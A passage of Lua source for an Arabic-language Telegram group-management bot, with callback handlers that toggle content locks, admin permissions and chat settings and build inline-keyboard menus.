local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_kickme') then
local UserId = Text:match('(%d+)/mute_kickme')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:KickMe"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر اطردني").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/addAdmins@(.*)') then
local UserId = {Text:match('(%d+)/addAdmins@(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local Info_Members = LuaTele.getSupergroupMembers(UserId[2], "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(LaRiCa.."Owners:Group"..UserId[2],v.member_id.user_id) 
x = x + 1
else
Redis:sadd(LaRiCa.."Admin:Group"..UserId[2],v.member_id.user_id) 
y = y + 1
end
end
end
LuaTele.answerCallbackQuery(data.id, "• تم ترقيه {"..y.."} ادمنيه \n• تم ترقية المالك ", true)
end
end
if Text and Text:match('(%d+)/LockAllGroup@(.*)') then
local UserId = {Text:match('(%d+)/LockAllGroup@(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:set(LaRiCa.."Lock:tagservrbot"..UserId[2],true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:set(LaRiCa..''..lock..UserId[2],"del")    
end
LuaTele.answerCallbackQuery(data.id, "• تم قفل جميع الاوامر بنجاح  ", true)
end
end
if Text and Text:match('/leftgroup@(.*)') then
local UserId = Text:match('/leftgroup@(.*)')
LuaTele.answerCallbackQuery(data.id, "• تم مغادره البوت من الكروب", true)
LuaTele.leaveChat(UserId)
end

if Text == 'kickBot' then
local Info_Members = LuaTele.getSupergroupMembers(ChatId, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
local Ban_Bots = LuaTele.setChatMemberStatus(ChatId,v.member_id.user_id,'banned',0)
if Ban_Bots.luatele == "ok" then
x = x + 1
end
end
local text = "• عدد البوتات الموجوده : "..#List_Members.."\n• تم طرد ( "..x.." ) بوت من المجموعة"
return LuaTele.editMessageText(ChatId,Msg_id,text,"md",true)  
end
if Text and Text:match('(%d+)/groupNumseteng//(%d+)') then
local UserId = {Text:match('(%d+)/groupNumseteng//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
return GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id)
end
end
if Text and Text:match('(%d+)/groupNum1//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum1//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).change_info) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'❬ ✗ ❭',nil,nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,0, 0, 0, 0,0,0,1,0})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه تغيير المعلومات", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,'❬ ✓ ❭',nil,nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,1, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum2//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum2//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).pin_messages) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه التثبيت", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'❬ ✗ ❭',nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,0, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه التثبيت", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,'❬ ✓ ❭',nil,nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,1, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum3//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum3//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).restrict_members) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه الحظر", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'❬ ✗ ❭',nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 0 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه الحظر", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,'❬ ✓ ❭',nil,nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, 1 ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum4//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum4//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).invite_users) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'❬ ✗ ❭',nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 0, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه دعوه المستخدمين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,'❬ ✓ ❭',nil,nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, 1, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum5//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum5//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).delete_messages) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'❬ ✗ ❭',nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 0, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه مسح الرسائل", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,'❬ ✓ ❭',nil)
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, 1, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, GetAdminsNum(ChatId,UserId[2]).promote})
end
end
end
if Text and Text:match('(%d+)/groupNum6//(%d+)') then
local UserId = {Text:match('(%d+)/groupNum6//(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if tonumber(GetAdminsNum(ChatId,UserId[2]).promote) == 1 then
LuaTele.answerCallbackQuery(data.id, "• تم تعطيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'❬ ✗ ❭')
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 0})
else
LuaTele.answerCallbackQuery(data.id, "• تم تفعيل صلاحيه اضافه مشرفين", true)
GetAdminsSlahe(ChatId,UserId[1],UserId[2],Msg_id,nil,nil,nil,nil,nil,'❬ ✓ ❭')
LuaTele.setChatMemberStatus(ChatId,UserId[2],'administrator',{0 ,GetAdminsNum(ChatId,UserId[2]).change_info, 0, 0, GetAdminsNum(ChatId,UserId[2]).delete_messages, GetAdminsNum(ChatId,UserId[2]).invite_users, GetAdminsNum(ChatId,UserId[2]).restrict_members ,GetAdminsNum(ChatId,UserId[2]).pin_messages, 1})
end
end
end
if Text and Text:match('(%d+)/web') then
local UserId = Text:match('(%d+)/web')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).web == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, false, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, true, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/info') then
local UserId = Text:match('(%d+)/info')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).info == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, false, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, true, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/invite') then
local UserId = Text:match('(%d+)/invite')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).invite == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, false, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, true, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/pin') then
local UserId = Text:match('(%d+)/pin')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).pin == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, false)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, true)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/media') then
local UserId = Text:match('(%d+)/media')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).media == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, false, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, true, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/messges') then
local UserId = Text:match('(%d+)/messges')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).messges == true then
LuaTele.setChatPermissions(ChatId, false, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, true, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/other') then
local UserId = Text:match('(%d+)/other')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).other == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, false, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, Getpermissions(ChatId).polls, true, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
elseif Text and Text:match('(%d+)/polls') then
local UserId = Text:match('(%d+)/polls')
if tonumber(IdUser) == tonumber(UserId) then
if Getpermissions(ChatId).polls == true then
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, false, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
else
LuaTele.setChatPermissions(ChatId, Getpermissions(ChatId).messges, Getpermissions(ChatId).media, true, Getpermissions(ChatId).other, Getpermissions(ChatId).web, Getpermissions(ChatId).info, Getpermissions(ChatId).invite, Getpermissions(ChatId).pin)
end
Get_permissions(ChatId,IdUser,Msg_id)
end
end
if Text and Text:match('(%d+)/listallAddorrem') then
local UserId = Text:match('(%d+)/listallAddorrem')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تعطيل الرابط', data = IdUser..'/'.. 'unmute_link'},{text = 'تفعيل الرابط', data = IdUser..'/'.. 'mute_link'},
},
{
{text = 'تعطيل الترحيب', data = IdUser..'/'.. 'unmute_welcome'},{text = 'تفعيل الترحيب', data = IdUser..'/'.. 'mute_welcome'},
},
{
{text = 'اتعطيل الايدي', data = IdUser..'/'.. 'unmute_Id'},{text = 'اتفعيل الايدي', data = IdUser..'/'.. 'mute_Id'},
},
{
{text = 'تعطيل الايدي بالصوره', data = IdUser..'/'.. 'unmute_IdPhoto'},{text = 'تفعيل الايدي بالصوره', data = IdUser..'/'.. 'mute_IdPhoto'},
},
{
{text = 'تعطيل الردود', data = IdUser..'/'.. 'unmute_ryple'},{text = 'تفعيل الردود', data = IdUser..'/'.. 'mute_ryple'},
},
{
{text = 'تعطيل الردود العامه', data = IdUser..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = IdUser..'/'.. 'mute_ryplesudo'},
},
{
{text = 'تعطيل الرفع', data = IdUser..'/'.. 'unmute_setadmib'},{text = 'تفعيل الرفع', data = IdUser..'/'.. 'mute_setadmib'},
},
{
{text = 'تعطيل الطرد', data = IdUser..'/'.. 'unmute_kickmembars'},{text = 'تفعيل الطرد', data = IdUser..'/'.. 'mute_kickmembars'},
},
{
{text = 'تعطيل الالعاب', data = IdUser..'/'.. 'unmute_games'},{text = 'تفعيل الالعاب', data = IdUser..'/'.. 'mute_games'},
},
{
{text = 'تعطيل اطردني', data = IdUser..'/'.. 'unmute_kickme'},{text = 'تفعيل اطردني', data = IdUser..'/'.. 'mute_kickme'},
},
{
{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =IdUser..'/'.. 'delAmr'}
},
}
}
return LuaTele.editMessageText(ChatId,Msg_id,'• اوامر التفعيل والتعطيل ', 'md', false, false, reply_markup)
end
end
if Text and Text:match('(%d+)/NextSeting') then
local UserId = Text:match('(%d+)/NextSeting')
if tonumber(IdUser) == tonumber(UserId) then
local Text = "*\n• اعدادات الكروب ".."\n• علامة ال (✓) تعني مقفول".."\n• علامة ال (✗) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(ChatId).lock_fwd, data = '&'},{text = 'التوجبه : ', data =IdUser..'/'.. 'Status_fwd'},
},
{
{text = GetSetieng(ChatId).lock_muse, data = '&'},{text = 'الصوت : ', data =IdUser..'/'.. 'Status_audio'},
},
{
{text = GetSetieng(ChatId).lock_ste, data = '&'},{text = 'الملصقات : ', data =IdUser..'/'.. 'Status_stikear'},
},
{
{text = GetSetieng(ChatId).lock_phon, data = '&'},{text = 'الجهات : ', data =IdUser..'/'.. 'Status_phone'},
},
{
{text = GetSetieng(ChatId).lock_join, data = '&'},{text = 'الدفرخ : ', data =IdUser..'/'.. 'Status_joine'},
},
{
{text = GetSetieng(ChatId).lock_add, data = '&'},{text = 'الاضافه : ', data =IdUser..'/'.. 'Status_addmem'},
},
{
{text = GetSetieng(ChatId).lock_self, data = '&'},{text = 'بصمه فيديو : ', data =IdUser..'/'.. 'Status_videonote'},
},
{
{text = GetSetieng(ChatId).lock_pin, data = '&'},{text = 'التثبيت : ', data =IdUser..'/'.. 'Status_pin'},
},
{
{text = GetSetieng(ChatId).lock_tagservr, data = '&'},{text = 'الاشعارات : ', data =IdUser..'/'.. 'Status_tgservir'},
},
{
{text = GetSetieng(ChatId).lock_mark, data = '&'},{text = 'الماركدون : ', data =IdUser..'/'.. 'Status_markdaun'},
},
{
{text = GetSetieng(ChatId).lock_edit, data = '&'},{text = 'التعديل : ', data =IdUser..'/'.. 'Status_edits'},
},
{
{text = GetSetieng(ChatId).lock_geam, data = '&'},{text = 'الالعاب : ', data =IdUser..'/'.. 'Status_games'},
},
{
{text = GetSetieng(ChatId).flood, data = '&'},{text = 'التكرار : ', data =IdUser..'/'.. 'Status_flood'},
},
{
{text = '- الرجوع ... ', data =IdUser..'/'.. 'NoNextSeting'}
},
{
{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =IdUser..'/'.. '/delAmr'}
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,Text, 'md', false, false, reply_markup)
end
end
if Text and Text:match('(%d+)/NoNextSeting') then
local UserId = Text:match('(%d+)/NoNextSeting')
if tonumber(IdUser) == tonumber(UserId) then
local Text = "*\n• اعدادات الكروب ".."\n• علامة ال (✓) تعني مقفول".."\n• علامة ال (✗) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(ChatId).lock_links, data = '&'},{text = 'الروابط : ', data =IdUser..'/'.. 'Status_link'},
},
{
{text = GetSetieng(ChatId).lock_spam, data = '&'},{text = 'الكلايش : ', data =IdUser..'/'.. 'Status_spam'},
},
{
{text = GetSetieng(ChatId).lock_inlin, data = '&'},{text = 'الكيبورد : ', data =IdUser..'/'.. 'Status_keypord'},
},
{
{text = GetSetieng(ChatId).lock_vico, data = '&'},{text = 'الاغاني : ', data =IdUser..'/'.. 'Status_voice'},
},
{
{text = GetSetieng(ChatId).lock_gif, data = '&'},{text = 'المتحركه : ', data =IdUser..'/'.. 'Status_gif'},
},
{
{text = GetSetieng(ChatId).lock_file, data = '&'},{text = 'الملفات : ', data =IdUser..'/'.. 'Status_files'},
},
{
{text = GetSetieng(ChatId).lock_text, data = '&'},{text = 'الدردشه : ', data =IdUser..'/'.. 'Status_text'},
},
{
{text = GetSetieng(ChatId).lock_ved, data = '&'},{text = 'الفيديو : ', data =IdUser..'/'.. 'Status_video'},
},
{
{text = GetSetieng(ChatId).lock_photo, data = '&'},{text = 'الصور : ', data =IdUser..'/'.. 'Status_photo'},
},
{
{text = GetSetieng(ChatId).lock_user, data = '&'},{text = 'المعرفات : ', data =IdUser..'/'.. 'Status_username'},
},
{
{text = GetSetieng(ChatId).lock_hash, data = '&'},{text = 'التاك : ', data =IdUser..'/'.. 'Status_tags'},
},
{
{text = GetSetieng(ChatId).lock_bots, data = '&'},{text = 'البوتات : ', data =IdUser..'/'.. 'Status_bots'},
},
{
{text = '٬ ꪀꫀ᥊𝓽 ٫ ', data =IdUser..'/'.. 'NextSeting'}
},
{
{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},
},
{
{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data =IdUser..'/'.. 'delAmr'}
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,Text, 'md', false, false, reply_markup)
end
end 
if Text and Text:match('(%d+)/delAmr') then
local UserId = Text:match('(%d+)/delAmr')
if tonumber(IdUser) == tonumber(UserId) then
return LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
end
end
if Text and Text:match('(%d+)/Status_link') then
local UserId = Text:match('(%d+)/Status_link')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الروابط', data =UserId..'/'.. 'lock_link'},{text = 'قفل الروابط بالكتم', data =UserId..'/'.. 'lock_linkktm'},
},
{
{text = 'قفل الروابط بالطرد', data =UserId..'/'.. 'lock_linkkick'},{text = 'قفل الروابط بالتقييد', data =UserId..'/'.. 'lock_linkkid'},
},
{
{text = 'فتح الروابط', data =UserId..'/'.. 'unlock_link'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الروابط", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_spam') then
local UserId = Text:match('(%d+)/Status_spam')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الكلايش', data =UserId..'/'.. 'lock_spam'},{text = 'قفل الكلايش بالكتم', data =UserId..'/'.. 'lock_spamktm'},
},
{
{text = 'قفل الكلايش بالطرد', data =UserId..'/'.. 'lock_spamkick'},{text = 'قفل الكلايش بالتقييد', data =UserId..'/'.. 'lock_spamid'},
},
{
{text = 'فتح الكلايش', data =UserId..'/'.. 'unlock_spam'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الكلايش", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_keypord') then
local UserId = Text:match('(%d+)/Status_keypord')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الكيبورد', data =UserId..'/'.. 'lock_keypord'},{text = 'قفل الكيبورد بالكتم', data =UserId..'/'.. 'lock_keypordktm'},
},
{
{text = 'قفل الكيبورد بالطرد', data =UserId..'/'.. 'lock_keypordkick'},{text = 'قفل الكيبورد بالتقييد', data =UserId..'/'.. 'lock_keypordkid'},
},
{
{text = 'فتح الكيبورد', data =UserId..'/'.. 'unlock_keypord'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الكيبورد", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_voice') then
local UserId = Text:match('(%d+)/Status_voice')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاغاني', data =UserId..'/'.. 'lock_voice'},{text = 'قفل الاغاني بالكتم', data =UserId..'/'.. 'lock_voicektm'},
},
{
{text = 'قفل الاغاني بالطرد', data =UserId..'/'.. 'lock_voicekick'},{text = 'قفل الاغاني بالتقييد', data =UserId..'/'.. 'lock_voicekid'},
},
{
{text = 'فتح الاغاني', data =UserId..'/'.. 'unlock_voice'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الاغاني", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_gif') then
local UserId = Text:match('(%d+)/Status_gif')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل المتحركه', data =UserId..'/'.. 'lock_gif'},{text = 'قفل المتحركه بالكتم', data =UserId..'/'.. 'lock_gifktm'},
},
{
{text = 'قفل المتحركه بالطرد', data =UserId..'/'.. 'lock_gifkick'},{text = 'قفل المتحركه بالتقييد', data =UserId..'/'.. 'lock_gifkid'},
},
{
{text = 'فتح المتحركه', data =UserId..'/'.. 'unlock_gif'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر المتحركات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_files') then
local UserId = Text:match('(%d+)/Status_files')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الملفات', data =UserId..'/'.. 'lock_files'},{text = 'قفل الملفات بالكتم', data =UserId..'/'.. 'lock_filesktm'},
},
{
{text = 'قفل الملفات بالطرد', data =UserId..'/'.. 'lock_fileskick'},{text = 'قفل الملفات بالتقييد', data =UserId..'/'.. 'lock_fileskid'},
},
{
{text = 'فتح الملفات', data =UserId..'/'.. 'unlock_files'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الملفات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_text') then
local UserId = Text:match('(%d+)/Status_text')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الدردشه', data =UserId..'/'.. 'lock_text'},
},
{
{text = 'فتح الدردشه', data =UserId..'/'.. 'unlock_text'},
},
{
